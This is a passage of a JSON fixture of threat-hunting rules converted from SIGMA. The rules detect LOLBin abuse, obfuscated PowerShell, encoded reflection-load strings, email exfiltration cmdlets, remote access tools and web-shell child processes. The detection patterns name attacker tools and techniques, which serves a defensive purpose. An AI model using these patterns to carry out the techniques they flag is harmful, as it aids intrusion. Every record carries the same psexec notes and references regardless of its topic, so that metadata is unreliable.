            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 687
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract cab using the \"/extract\" argument that is no longer supported.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cab File Extraction Via Wusa.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wusa.exe\" and tgt.process.cmdline contains \"/extract:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 688
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious New Instance Of An Office COM Object",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and (tgt.process.image.path contains \"\\eqnedt32.exe\" or tgt.process.image.path contains \"\\excel.exe\" or tgt.process.image.path contains \"\\msaccess.exe\" or tgt.process.image.path contains \"\\mspub.exe\" or tgt.process.image.path contains \"\\powerpnt.exe\" or tgt.process.image.path contains \"\\visio.exe\" or tgt.process.image.path contains \"\\winword.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 689
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This is a threat-hunting query to collect information related to the interactive execution of a script from inside a compressed file (zip/rar). Windows will automatically run the script using scripting interpreters such as wscript and cscript binaries.\n\nFrom the query below, the child process is the script interpreter that will execute the script. The script extension is also a set of standard extensions that Windows OS recognizes. Selections 1-3 contain three different execution scenarios.\n    1. Compressed file opened using 7zip.\n    2. Compressed file opened using WinRar.\n    3. Compressed file opened using native windows File Explorer capabilities.\n\nWhen the malicious script is double-clicked, it will be extracted to the respected directories as signified by the CommandLine on each of the three Selections. It will then be executed using the relevant script interpreter.\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Manual Execution of Script Inside of a Compressed File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path=\"*\\7z*.exe\" and tgt.process.cmdline=\"*\\AppData\\local\\temp\\7z*\\*\") or (src.process.image.path contains \"\\winrar.exe\" and tgt.process.cmdline=\"*\\AppData\\local\\temp\\rar*\\*\") or (src.process.image.path contains \"\\explorer.exe\" and (tgt.process.cmdline contains \"\\AppData\\local\\temp\\*.rar\\\" or tgt.process.cmdline contains \"\\AppData\\local\\temp\\*.zip\\\"))) and ((tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and (tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".jse\" or tgt.process.cmdline contains \".ps1\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".wsf\" or tgt.process.cmdline contains \".wsh\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 690
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a file or folder's permissions being modified or tampered with.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1222"
            ],
            "name": "File or Folder Permissions Modifications",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\cacls.exe\" or tgt.process.image.path contains \"\\icacls.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and (tgt.process.cmdline contains \"/grant\" or tgt.process.cmdline contains \"/setowner\" or tgt.process.cmdline contains \"/inheritance:r\")) or (tgt.process.image.path contains \"\\attrib.exe\" and tgt.process.cmdline contains \"-r\") or tgt.process.image.path contains \"\\takeown.exe\") and (not (tgt.process.cmdline contains \"ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\connectivity.history /reset\" or (tgt.process.cmdline contains \"ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\config.properties /grant :r \" and tgt.process.cmdline contains \"S-1-5-19:F\") or (tgt.process.cmdline contains \"\\AppData\\Local\\Programs\\Microsoft VS Code\" or tgt.process.cmdline contains \":\\Program Files\\Microsoft VS Code\") or (tgt.process.cmdline contains \":\\Program Files (x86)\\Avira\" or tgt.process.cmdline contains \":\\Program Files\\Avira\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 691
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a child \"explorer.exe\" process from a shell like process such as \"cmd.exe\" or \"powershell.exe\".\nAttackers can use \"explorer.exe\" for evading defense mechanisms by proxying the execution through the latter.\nWhile this is often a legitimate action, this rule can be use to hunt for anomalies.\nMuddy Waters threat actor was seeing using this technique.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Proxy Execution Via Explorer.EXE From Shell Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"explorer.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 692
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the launch of a child process via \"conhost.exe\" with the \"--headless\" flag.\nThe \"--headless\" flag hides the windows from the user upon execution.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059"
            ],
            "name": "Headless Process Launched Via Conhost.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\conhost.exe\" and src.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 693
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Disabled IE Security Features",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -name IEHarden \" and tgt.process.cmdline contains \" -value 0 \") or (tgt.process.cmdline contains \" -name DEPOff \" and tgt.process.cmdline contains \" -value 1 \") or (tgt.process.cmdline contains \" -name DisableFirstRunCustomize \" and tgt.process.cmdline contains \" -value 2 \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 694
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Suspicious GrpConv Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"grpconv.exe -o\" or tgt.process.cmdline contains \"grpconv -o\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 695
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Stdin",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"(?i)(set).*&&\\\\s?set.*(environment|invoke|\\\\$\\\\{?input).*&&.*\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 696
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using SettingSyncHost.exe to run hijacked binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Using SettingSyncHost.exe as LOLBin",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\")) and (src.process.cmdline contains \"cmd.exe /c\" and src.process.cmdline contains \"RoamDiag.cmd\" and src.process.cmdline contains \"-outputpath\"))) | columns TargetFilename,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 697
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027"
            ],
            "name": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATABvACIAKwAiAGEAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATABvAGEAIgArACIAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA\" or tgt.process.cmdline contains \"6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATABvACcAKwAnAGEAZAAnACkA\" or tgt.process.cmdline contains \"6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATABvAGEAJwArACcAZAAnACkA\" or tgt.process.cmdline contains \"6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 698
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects email exfiltration via powershell cmdlets",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Email Exifiltration Via Powershell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Add-PSSnapin\" and tgt.process.cmdline contains \"Get-Recipient\" and tgt.process.cmdline contains \"-ExpandProperty\" and tgt.process.cmdline contains \"EmailAddresses\" and tgt.process.cmdline contains \"SmtpAddress\" and tgt.process.cmdline contains \"-hidetableheaders\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 699
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - GoToAssist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"GoTo Opener\" or tgt.process.displayName=\"GoTo Opener\" or tgt.process.publisher=\"LogMeIn, Inc.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 700
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1190"
            ],
            "name": "Suspicious Process By Web Server Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\php.exe\" or src.process.image.path contains \"\\tomcat.exe\" or src.process.image.path contains \"\\UMWorkerProcess.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_TomcatService.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.cmdline contains \"CATALINA_HOME\" or src.process.cmdline contains \"catalina.home\" or src.process.cmdline contains \"catalina.jar\"))) and (tgt.process.image.path contains \"\\arp.exe\" or tgt.process.image.path contains \"\\at.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\dsget.exe\" or tgt.process.image.path contains \"\\hostname.exe\" or tgt.process.image.path contains \"\\nbtstat.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netdom.exe\" or tgt.process.image.path contains \"\\netsh.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ntdsutil.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\qprocess.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\qwinsta.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\sc.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wusa.exe\") and (not ((src.process.image.path contains \"\\java.exe\" and tgt.process.cmdline contains \"Windows\\system32\\cmd.exe /c C:\\ManageEngine\\ADManager \\\"Plus\\ES\\bin\\elasticsearch.bat -Enode.name=RMP-NODE1 -pelasticsearch-pid.txt\") or (src.process.image.path contains \"\\java.exe\" and (tgt.process.cmdline contains \"sc query\" and tgt.process.cmdline contains \"ADManager Plus\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 701
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
